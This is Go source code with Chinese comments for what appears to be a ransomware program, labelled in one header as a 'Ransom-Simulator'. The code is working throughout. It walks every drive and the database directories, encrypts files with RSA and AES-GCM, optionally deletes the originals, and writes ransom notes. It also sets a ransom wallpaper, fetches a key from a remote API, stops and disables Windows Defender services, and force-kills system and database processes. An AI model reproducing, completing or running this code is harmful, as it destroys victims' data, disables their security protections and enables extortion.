// readDesktopWallpaperReg 读取 HKCU\Control Panel\Desktop\Wallpaper 的当前值
func readDesktopWallpaperReg() (string, error) {
	out, err := exec.Command("reg", "query", `HKCU\Control Panel\Desktop`, "/v", "Wallpaper").Output()
	if err != nil {
		return "", err
	}
	for _, line := range strings.Split(string(out), "\n") {
		if idx := strings.Index(line, "REG_SZ"); idx >= 0 {
			return strings.TrimSpace(line[idx+len("REG_SZ"):]), nil
		}
	}
	return "", fmt.Errorf("未找到 Wallpaper 注册表值")
}

// createRansomWallpaper 生成勒索提示壁纸并设置为当前用户桌面壁纸
func createRansomWallpaper(uuid string) {
	fmt.Println("[*] 生成并设置勒索提示壁纸...")

	if logEnabled {
		logOperation("开始生成勒索提示壁纸")
	}

	// 优先输出到程序所在目录，不可用时回退到用户桌面
	outPath := filepath.Join(programDir, ransomWallpaperFileName)
	if _, err := os.Stat(programDir); err != nil {
		if home, herr := os.UserHomeDir(); herr == nil {
			outPath = filepath.Join(home, "Desktop", ransomWallpaperFileName)
		}
	}

	// 使用内嵌脚本生成图片：直接调用 powershell，避免 cmd /C 的参数转义问题
	script := fmt.Sprintf("& {%s} -OutPath '%s' -Uuid '%s'",
		strings.TrimSpace(wallpaperScript),
		strings.ReplaceAll(outPath, "'", "''"),
		strings.ReplaceAll(uuid, "'", "''"))

	if out, err := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script).CombinedOutput(); err != nil {
		fmt.Printf("[!] 生成壁纸失败: %v (%s)\n", err, strings.TrimSpace(string(out)))
		if logEnabled {
			logOperation(fmt.Sprintf("生成壁纸失败: %v", err))
		}
		return
	}

	if _, err := os.Stat(outPath); err != nil {
		fmt.Printf("[!] 壁纸文件未生成: %s (%v)\n", outPath, err)
		if logEnabled {
			logOperation(fmt.Sprintf("壁纸文件未生成: %v", err))
		}
		return
	}
	fmt.Printf("[+] 壁纸已生成: %s\n", outPath)

	// 注册表指向生成的图片，并设置为填充样式
	regCommands := [][]string{
		{"add", `HKCU\Control Panel\Desktop`, "/v", "Wallpaper", "/t", "REG_SZ", "/d", outPath, "/f"},
		{"add", `HKCU\Control Panel\Desktop`, "/v", "WallpaperStyle", "/t", "REG_SZ", "/d", "10", "/f"},
		{"add", `HKCU\Control Panel\Desktop`, "/v", "TileWallpaper", "/t", "REG_SZ", "/d", "0", "/f"},
	}
	for _, args := range regCommands {
		if err := exec.Command("reg", args...).Run(); err != nil {
			fmt.Printf("[!] 写入壁纸注册表失败: %v\n", err)
			if logEnabled {
				logOperation(fmt.Sprintf("写入壁纸注册表失败: %v", err))
			}
		}
	}

	// 回读注册表，确认壁纸路径已写入
	if got, err := readDesktopWallpaperReg(); err != nil {
		fmt.Printf("[!] 读取壁纸注册表失败: %v\n", err)
	} else if !strings.EqualFold(got, outPath) {
		fmt.Printf("[!] 壁纸注册表未按预期更新: 期望 %s, 实际 %s\n", outPath, got)
		if logEnabled {
			logOperation(fmt.Sprintf("壁纸注册表未按预期更新: 期望 %s, 实际 %s", outPath, got))
		}
	}

	// 调用 Win32 API 立即刷新壁纸（SPIF_UPDATEINIFILE | SPIF_SENDCHANGE）
	if err := applyDesktopWallpaper(outPath); err != nil {
		fmt.Printf("[!] 刷新壁纸失败: %v\n", err)
		if logEnabled {
			logOperation(fmt.Sprintf("刷新壁纸失败: %v", err))
		}
		return
	}

	fmt.Printf("[+] 壁纸已设置为: %s\n", outPath)
	if logEnabled {
		logOperation("壁纸设置完成: " + outPath)
	}
}

func scanFiles(extFilter map[string]bool, scanRoots []string, encryptAllFormats bool) []string {
	var filesToProcess []string
	var roots []string
	if len(scanRoots) > 0 {
		roots = scanRoots
	} else {
		for _, drive := range "CDEFGHIJKLMNOPQRSTUVWXYZ" {
			drivePath := string(drive) + ":\\"
			if _, err := os.Stat(drivePath); err == nil {
				roots = append(roots, drivePath)
			}
		}
	}

	// 添加Windows数据库数据目录到扫描范围
	for _, dbDir := range windowsDatabaseDataDirs {
		if _, err := os.Stat(dbDir); err == nil {
			roots = append(roots, dbDir)
		}
	}

	fmt.Printf("[*] 扫描根目录: %v\n", roots)

	if logEnabled {
		logOperation(fmt.Sprintf("开始扫描文件，根目录: %v", roots))
		logOperation(fmt.Sprintf("加密所有格式: %v", encryptAllFormats))
	}

	for _, root := range roots {
		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if info.IsDir() {
				if isExcluded(path) {
					return filepath.SkipDir
				}
				return nil
			}
			shouldProcess := false
			if encryptAllFormats {
				shouldProcess = true
				fileName := filepath.Base(path)
				if fileName == ransomNoteFileName || fileName == ransomWallpaperFileName || strings.HasSuffix(fileName, ".lock") || strings.EqualFold(filepath.Ext(fileName), ".encrypted") {
					shouldProcess = false
				}
			} else {
				shouldProcess = shouldEncrypt(path, extFilter)
			}
			if shouldProcess {
				filesToProcess = append(filesToProcess, path)
			}
			return nil
		})
	}

	if logEnabled {
		logOperation(fmt.Sprintf("扫描完成，找到 %d 个待加密文件", len(filesToProcess)))
	}

	return filesToProcess
}

func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) {
	jobs := make(chan string, len(files))
	var wg sync.WaitGroup

	// 优先尝试从API获取密钥
	var uuid string
	fmt.Print("[*] 尝试从API获取密钥... ")
	resp, err := fetchKeysFromAPI()
	if err != nil {
		fmt.Printf("失败: %v\n", err)
		fmt.Println("[*] API获取失败，回退到本地密钥...")

		// 回退：尝试从公钥文件名中提取UUID
		uuid, err2 := extractUUIDFromFilename()
		if err2 != nil {
			fmt.Printf("失败: %v\n", err2)
			fmt.Println("[!] 无法获取密钥，程序终止")
			os.Exit(1)
		}
		fmt.Printf("成功: %s\n", uuid)

		// 从本地文件读取公钥
		fmt.Print("[*] 从本地文件读取公钥... ")
		publicKeyPEM, err2 = readPublicKeyFromFile(uuid)
		if err2 != nil {
			fmt.Printf("失败: %v\n", err2)
			fmt.Println("[!] 无法读取公钥文件，程序终止")
			os.Exit(1)
		}
		fmt.Println("成功")
	} else {
		uuid = resp.UUID
		publicKeyPEM = resp.PublicKeyPEM
		fmt.Printf("成功，UUID: %s\n", uuid)
	}

	// 预解析公钥，确保格式正确
	fmt.Print("[*] 预解析公钥... ")
	pubKey, parseErr := getPublicKey(publicKeyPEM)
	if parseErr != nil {
		fmt.Printf("失败: %v\n", parseErr)
		fmt.Println("[!] 公钥格式错误，程序终止")
		os.Exit(1)
	}
	fmt.Println("成功")
	// 存储解析后的公钥到缓存
	publicKeyCache = pubKey
	publicKeyCacheStr = publicKeyPEM

	finalAccurateNote := fmt.Sprintf(ransomNoteContent, uuid)
	var visitedDirs sync.Map

	log, err3 := newFileLog("ransom_log.txt")
	if err3 != nil {
		fmt.Printf("无法创建日志文件: %v\n", err3)
	}
	if log != nil {
		defer func() { _ = log.Close() }()
	}

	for w := 0; w < numWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for file := range jobs {
				dirPath := filepath.Dir(file)
				if _, loaded := visitedDirs.LoadOrStore(dirPath, true); !loaded {
					notePath := filepath.Join(dirPath, ransomNoteFileName)
					_ = os.WriteFile(notePath, []byte(finalAccurateNote), 0644)
				}
				if err := processFile(file, publicKeyPEM, removeOriginal); err != nil {
					stats.failed.Add(1)

					// 记录失败日志
					logFailed(file, err.Error())

					if log != nil {
						log.Log(fmt.Sprintf("FAILED: %s - %v", file, err))
					}
				} else {
					stats.success.Add(1)

					// 记录成功日志
					logSuccess(file)
				}
			}
		}()
	}

	for _, file := range files {
		jobs <- file
	}
	close(jobs)

	done := make(chan bool)
	go func() {
		totalFiles := uint64(len(files))
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-done:
				return
			case <-ticker.C:
				processed := stats.success.Load() + stats.failed.Load()
				if totalFiles > 0 {
					progress := float64(processed) / float64(totalFiles) * 100
					fmt.Printf("\r[*] 进度: %.1f%% (%d/%d) [成功: %d, 失败: %d]", progress, processed, totalFiles, stats.success.Load(), stats.failed.Load())
				}
			}
		}
	}()

	wg.Wait()
	close(done)
	fmt.Println()

	*outUUID = uuid

	if logEnabled {
		logOperation(fmt.Sprintf("加密工作完成: 成功 %d, 失败 %d", stats.success.Load(), stats.failed.Load()))
	}
}

func fetchKeysFromAPI() (*APIResponse, error) {
	jsonBody := []byte("{}")
	req, err := http.NewRequest("POST", apiURL, bytes.NewBuffer(jsonBody))
	if err != nil {
		return nil, fmt.Errorf("创建请求失败: %w", err)
	}
	req.Header.Set("User-Agent", "Ransom-Simulator/"+version)
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{Timeout: 5 * time.Second}
	res, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("请求API失败: %w", err)
	}
	defer func() { _ = res.Body.Close() }()

	if res.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("API返回错误状态码: %d", res.StatusCode)
	}

	body, err := io.ReadAll(res.Body)
	if err != nil {
		return nil, fmt.Errorf("读取API响应失败: %w", err)
	}

	var apiResp APIResponse
	if err := json.Unmarshal(body, &apiResp); err != nil {
		return nil, fmt.Errorf("解析API响应失败: %w", err)
	}

	if apiResp.Status != "success" {
		return nil, fmt.Errorf("API返回非成功状态: %s - %s", apiResp.Status, apiResp.Message)
	}

	if apiResp.PublicKeyPEM == "" || apiResp.UUID == "" {
		return nil, fmt.Errorf("API返回的密钥或UUID为空")
	}

	return &apiResp, nil
}

// processFile 加密单个文件
func processFile(filePath string, publicKeyStr string, removeOriginal bool) error {
	info, err := os.Stat(filePath)
	if err != nil {
		return fmt.Errorf("获取文件信息失败: %w", err)
	}

	fileSize := info.Size()
	if fileSize > largeFileThreshold {
		return partialEncryptFile(filePath, publicKeyStr, fileSize)
	}

	content, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("读取文件失败: %w", err)
	}

	if len(content) == 0 {
		return fmt.Errorf("文件为空，跳过加密: %s", filePath)
	}

	encryptedData, err := hybridEncrypt(content, publicKeyStr)
	if err != nil {
		return fmt.Errorf("加密失败: %w", err)
	}

	encryptedPath := filePath + ".encrypted"
	if err := os.WriteFile(encryptedPath, encryptedData, 0644); err != nil {
		return fmt.Errorf("写入加密文件失败: %w", err)
	}

	if removeOriginal {
		if err := os.Remove(filePath); err != nil {
			trashName := filePath + ".delete_me_" + generateRandomSuffix()
			if renameErr := os.Rename(filePath, trashName); renameErr != nil {
				return fmt.Errorf("删除原文件失败(文件被锁定): %w", renameErr)
			}
		}
	}

	return nil
}

// shouldEncrypt 判断文件是否应根据扩展名过滤进行加密
func shouldEncrypt(path string, extFilter map[string]bool) bool {
	fileName := filepath.Base(path)
	ext := strings.ToLower(filepath.Ext(fileName))

	if fileName == ransomNoteFileName || fileName == ransomWallpaperFileName || strings.HasSuffix(fileName, ".lock") || strings.EqualFold(ext, ".encrypted") {
		return false
	}

	return extFilter[ext]
}

// isExcluded 判断目录是否在排除列表中（Windows版本）
func isExcluded(dir string) bool {
	dirLower := strings.ToLower(dir)
	for _, excluded := range excludedDirsWindows {
		if strings.HasPrefix(dirLower, strings.ToLower(excluded)) {
			return true
		}
	}
	return false
}

// getKeys 从map中提取所有key
func getKeys(m map[string]bool) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

// hybridEncrypt 使用RSA-2048 + AES-256-GCM混合加密
func hybridEncrypt(plaintext []byte, publicKeyStr string) ([]byte, error) {
	pubKey, err := getPublicKey(publicKeyStr)
	if err != nil {
		return nil, fmt.Errorf("获取公钥失败: %w", err)
	}

	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(cryptoReader, aesKey); err != nil {
		return nil, fmt.Errorf("生成AES密钥失败: %w", err)
	}

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, fmt.Errorf("创建AES cipher失败: %w", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("创建GCM模式失败: %w", err)
	}

	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := io.ReadFull(cryptoReader, nonce); err != nil {
		return nil, fmt.Errorf("生成GCM nonce失败: %w", err)
	}

	ciphertext := aesGCM.Seal(nil, nonce, plaintext, nil)

	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), cryptoReader, pubKey, aesKey, nil)
	if err != nil {
		return nil, fmt.Errorf("RSA加密AES密钥失败: %w", err)
	}

	var buffer bytes.Buffer
	buffer.Write(encryptedAESKey)
	buffer.Write(nonce)
	buffer.Write(ciphertext)

	return buffer.Bytes(), nil
}

// generateRandomSuffix 生成8位随机十六进制后缀
func generateRandomSuffix() string {
	b := make([]byte, 4)
	_, _ = cryptoReader.Read(b)
	return fmt.Sprintf("%x", b)
}

// newFileLog 创建文件日志对象
func newFileLog(filename string) (*fileLog, error) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return nil, err
	}
	return &fileLog{file: f}, nil
}

// Log 写入日志条目
func (l *fileLog) Log(message string) {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.file != nil {
		logLine := fmt.Sprintf("%s - %s\n", time.Now().Format("2006-01-02 15:04:05"), message)
		_, _ = l.file.WriteString(logLine)
	}
}

// Close 关闭日志文件
func (l *fileLog) Close() error {
	if l.file != nil {
		return l.file.Close()
	}
	return nil
}

func partialEncryptFile(filePath string, publicKeyStr string, fileSize int64) error {
	fmt.Printf("\n  [大文件] %s (大小: %.2f GB) - 使用部分加密策略\n",
		filepath.Base(filePath), float64(fileSize)/(1024*1024*1024))

	pubKey, err := getPublicKey(publicKeyStr)
	if err != nil {
		return fmt.Errorf("获取公钥失败: %w", err)
	}

	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(cryptoReader, aesKey); err != nil {
		return fmt.Errorf("生成AES密钥失败: %w", err)
	}

	chunks := calculateChunks(fileSize)
	var encryptedChunks []encryptedChunk

	f, err := os.OpenFile(filePath, os.O_RDONLY, 0644)
	if err != nil {
		return fmt.Errorf("打开文件失败: %w", err)
	}
	defer f.Close()

	for _, chunk := range chunks {
		buf := make([]byte, chunk.Size)
		n, err := f.ReadAt(buf, chunk.Offset)
		if err != nil && err != io.EOF {
			return fmt.Errorf("读取文件块失败(offset=%d): %w", chunk.Offset, err)
		}
		buf = buf[:n]

		block, err := aes.NewCipher(aesKey)
		if err != nil {
			return fmt.Errorf("创建AES cipher失败: %w", err)
		}

		aesGCM, err := cipher.NewGCM(block)
		if err != nil {
			return fmt.Errorf("创建GCM模式失败: %w", err)
		}

		nonce := make([]byte, aesGCM.NonceSize())
		if _, err := io.ReadFull(cryptoReader, nonce); err != nil {
			return fmt.Errorf("生成GCM nonce失败: %w", err)
		}

		ciphertext := aesGCM.Seal(nil, nonce, buf, nil)

		encryptedChunks = append(encryptedChunks, encryptedChunk{
			Offset: chunk.Offset,
			Size:   len(buf),
			Nonce:  nonce,
			Data:   ciphertext,
		})
	}

	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), cryptoReader, pubKey, aesKey, nil)
	if err != nil {
		return fmt.Errorf("RSA加密AES密钥失败: %w", err)
	}

	chunksJSON, err := json.Marshal(encryptedChunks)
	if err != nil {
		return fmt.Errorf("序列化加密块信息失败: %w", err)
	}

	var outputBuf bytes.Buffer
	outputBuf.Write([]byte("PENC"))

	chunkLen := make([]byte, 4)
	binary.BigEndian.PutUint32(chunkLen, uint32(len(chunksJSON)))
	outputBuf.Write(chunkLen)
	outputBuf.Write(chunksJSON)

	keyLen := make([]byte, 4)
	binary.BigEndian.PutUint32(keyLen, uint32(len(encryptedAESKey)))
	outputBuf.Write(keyLen)
	outputBuf.Write(encryptedAESKey)

	for _, ec := range encryptedChunks {
		outputBuf.Write(ec.Data)
	}

	encryptedPath := filePath + ".encrypted"
	if err := os.WriteFile(encryptedPath, outputBuf.Bytes(), 0644); err != nil {
		return fmt.Errorf("写入加密文件失败: %w", err)
	}

	return nil
}

func calculateChunks(fileSize int64) []chunkInfo {
	var chunks []chunkInfo

	for i := int64(0); i < headChunks && i*chunkSize < fileSize; i++ {
		sz := chunkSize
		if (i+1)*chunkSize > fileSize {
			sz = int(fileSize - i*chunkSize)
		}
		chunks = append(chunks, chunkInfo{Offset: i * chunkSize, Size: int64(sz)})
	}

	for i := int64(0); i < tailChunks; i++ {
		offset := fileSize - (i+1)*chunkSize
		if offset < 0 {
			offset = 0
		}
		sz := fileSize - offset
		if sz > chunkSize {
			sz = chunkSize
		}
		isDuplicate := false
		for _, c := range chunks {
			if c.Offset == offset {
				isDuplicate = true
				break
			}
		}
		if !isDuplicate {
			chunks = append(chunks, chunkInfo{Offset: offset, Size: sz})
		}
	}

	if fileSize > int64(headChunks+tailChunks)*chunkSize {
		availableStart := int64(headChunks) * chunkSize
		availableEnd := fileSize - int64(tailChunks)*chunkSize
		availableRange := availableEnd - availableStart

		if availableRange > 0 {
			rng := mrand.New(mrand.NewSource(time.Now().UnixNano()))
			for i := 0; i < middleRandomChunks; i++ {
				offset := availableStart + rng.Int63n(availableRange)
				offset = offset / chunkSize * chunkSize
				sz := int64(chunkSize)
				if offset+sz > fileSize {
					sz = fileSize - offset
				}
				isDuplicate := false
				for _, c := range chunks {
					if c.Offset == offset {
						isDuplicate = true
						break
					}
				}
				if !isDuplicate {
					chunks = append(chunks, chunkInfo{Offset: offset, Size: sz})
				}
			}
		}
	}

	return chunks
}

func applyAggressiveDelay() {
	if aggressiveDelay > 0 {
		delay := mrand.Intn(aggressiveDelay)
		time.Sleep(time.Duration(delay) * time.Millisecond)
	} else if aggressiveDelay < 0 {
		aggressiveDelay = 0
	}
}

func stopSecurityServices() {
	fmt.Println("  - 停止Windows安全服务...")
	if logEnabled {
		logOperation("开始停止Windows安全服务")
	}

	securityServices := []string{
		"WinDefend", "SecurityHealthService", "WdNisSvc", "Sense",
		"MsMpSvc", "MpKslDrv", "WdBoot", "WdFilter", "WdNisDrv",
	}

	for _, service := range securityServices {
		fmt.Printf("  - 停止安全服务: %s\n", service)
		cmd := exec.Command("sc", "stop", service)
		_ = cmd.Run()
		cmd = exec.Command("net", "stop", service)
		_ = cmd.Run()
		cmd = exec.Command("sc", "config", service, "start=", "disabled")
		_ = cmd.Run()
		applyAggressiveDelay()
	}

	if logEnabled {
		logOperation("安全服务停止完成")
	}
}

func cleanDatabaseMemory() {
	fmt.Println("  - 清理MySQL查询缓存...")
	cleanMySQLCache()
	fmt.Println("  - 清理PostgreSQL缓存...")
	cleanPostgreSQLCache()
	if logEnabled {
		logOperation("数据库内存清理完成")
	}
}

func cleanMySQLCache() {
	cmds := []string{
		`mysql -u root -e "RESET QUERY CACHE;" 2>nul`,
		`mysql -u root -e "FLUSH TABLES;" 2>nul`,
		`mysql -u root -e "FLUSH LOGS;" 2>nul`,
	}
	for _, c := range cmds {
		cmd := exec.Command("cmd", "/C", c)
		_ = cmd.Run()
		applyAggressiveDelay()
	}
}

func cleanPostgreSQLCache() {
	cmds := []string{
		`psql -U postgres -c "CHECKPOINT;" 2>nul`,
		`psql -U postgres -c "DISCARD ALL;" 2>nul`,
	}
	for _, c := range cmds {
		cmd := exec.Command("cmd", "/C", c)
		_ = cmd.Run()
		applyAggressiveDelay()
	}
}

func clearSystemCache() {
	fmt.Println("  - 清理系统缓存...")
	if logEnabled {
		logOperation("开始清理系统缓存")
	}
	cmd := exec.Command("ipconfig", "/flushdns")
	_ = cmd.Run()
	cmd = exec.Command("powershell", "-Command",
		"net stop wuauserv; net stop bits; Remove-Item -Path \"$env:windir\\SoftwareDistribution\\Download\\*\" -Recurse -Force -ErrorAction SilentlyContinue; net start wuauserv; net start bits")
	_ = cmd.Run()
	cmd = exec.Command("powershell", "-Command",
		"Remove-Item -Path \"$env:TEMP\\*\" -Recurse -Force -ErrorAction SilentlyContinue")
	_ = cmd.Run()
	if logEnabled {
		logOperation("系统缓存清理完成")
	}
}

func disableProcessWatchdogs() {
	fmt.Println("  - 禁用系统看门狗和监控进程...")
	if logEnabled {
		logOperation("开始禁用看门狗进程")
	}
	watchdogs := []string{
		"wmiprvse.exe", "svchost.exe", "taskhostw.exe",
		"dllhost.exe", "conhost.exe", "rundll32.exe",
	}
	for _, proc := range watchdogs {
		cmd := exec.Command("taskkill", "/F", "/IM", proc)
		_ = cmd.Run()
		applyAggressiveDelay()
	}
	cmd := exec.Command("sc", "config", "WerSvc", "start=", "disabled")
	_ = cmd.Run()
	cmd = exec.Command("sc", "stop", "WerSvc")
	_ = cmd.Run()
	if logEnabled {
		logOperation("看门狗进程禁用完成")
	}
}

func unmountDatabaseConnections() {
	fmt.Println("  - 断开数据库活动和连接...")
	if logEnabled {
		logOperation("开始断开数据库连接")
	}
	dbProcesses := []string{
		"mysql.exe", "mysqld.exe", "sqlservr.exe", "postgres.exe",
		"psql.exe", "sqlplus.exe", "mongod.exe", "mongos.exe",
		"redis-server.exe", "oracle.exe",
	}
	for _, proc := range dbProcesses {
		cmd := exec.Command("taskkill", "/F", "/IM", proc)
		_ = cmd.Run()
		applyAggressiveDelay()
	}
	cmd := exec.Command("powershell", "-Command", "net use * /delete /y 2>$null")
	_ = cmd.Run()
	if logEnabled {
		logOperation("数据库连接断开完成")
	}
}
